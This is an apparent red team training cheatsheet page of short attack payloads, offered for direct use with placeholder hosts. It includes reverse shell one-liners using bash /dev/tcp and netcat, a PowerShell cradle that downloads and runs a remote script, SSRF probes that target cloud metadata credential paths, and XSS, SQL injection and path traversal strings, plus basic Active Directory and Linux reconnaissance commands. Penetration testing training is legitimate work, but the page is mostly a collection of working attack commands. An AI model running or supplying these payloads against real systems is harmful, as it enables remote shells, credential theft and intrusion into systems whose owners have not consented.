---
layout: training-page
title: "Quick Payloads — Red Team Academy"
module: "Ops Cheatsheets"
tags:
  - cheatsheet
  - payloads
  - one-liners
page_key: "cheatsheets-quick-payloads"
render_with_liquid: false
updated: "2026-04-13"
---

# Quick Payloads

Curated **short probes and patterns** — not a full library. For depth, use the module pages (e.g. [SSRF](/web/ssrf/), [SQLi](/web/sql-injection/)). All hostnames and IPs are placeholders.

## Web — SSRF / callbacks

```
# Out-of-band callback (replace with your Collaborator / interactsh host)
http://<OAST_HOST>/
http://<OAST_HOST>/ssrf-probe

# Loopback probes (parameter may be ?url=, ?fetch=, ?src=, etc.)
http://127.0.0.1/
http://127.0.0.1:22/
http://127.0.0.1:6379/
http://[::1]/

# Cloud metadata (AWS IMDSv1 style — requires vulnerable SSRF)
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# GCP / Azure often need headers — see full SSRF page
```

## Web — XSS (minimal tests)

```
"><svg/onload=alert(1)>
'><script>alert(1)</script>
javascript:alert(1)
<img src=x onerror=alert(1)>
```

## Web — SQLi (quick differentiation)

```
' OR '1'='1
' OR '1'='1'--
" OR "1"="1
1' AND '1'='1
1 AND 1=1
1 AND 1=2
' UNION SELECT NULL,NULL--
```

## Web — path / file hints

```
../../../../etc/passwd
....//....//....//etc/passwd
/var/www/html/config.php
C:\Windows\win.ini
```

## Web — JWT (test only in lab / authorized targets)

```
# "none" algorithm abuse (classic test — many APIs reject it)
# Decode JWT, set alg to none, re-encode per your tool (jwt_tool, etc.)
```

## Reverse shells — bash / nc

```
bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> <LPORT> >/tmp/f

nc -e /bin/sh <LHOST> <LPORT>
```

## PowerShell — download cradle (scoped use)

```
IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>/run.ps1')
```

## Active Directory — quick PowerShell stubs

```powershell
whoami /all
hostname; [Environment]::UserName; [Environment]::MachineName
Get-ADUser -Filter * -Properties ServicePrincipalName | ? {$_.ServicePrincipalName}
```

## Kerberos — roasting hints (use proper tools in engagement)

```
# Kerberoastable accounts often have SPNs — collect hashes with authorized tooling
# AS-REP: accounts with "Do not require Kerberos preauthentication"
```

## Linux — situational awareness

```
id; whoami; hostname
sudo -l
find / -perm -4000 2>/dev/null | head
ss -lntp
cat /etc/os-release
```

## Resources

- [SSRF](/web/ssrf/) — full chains and cloud metadata
- [SQL injection](/web/sql-injection/)
- [Reverse shells](/exploitation/reverse-shells/)
- PayloadsAllTheThings — `https://github.com/swisskyrepo/PayloadsAllTheThings`
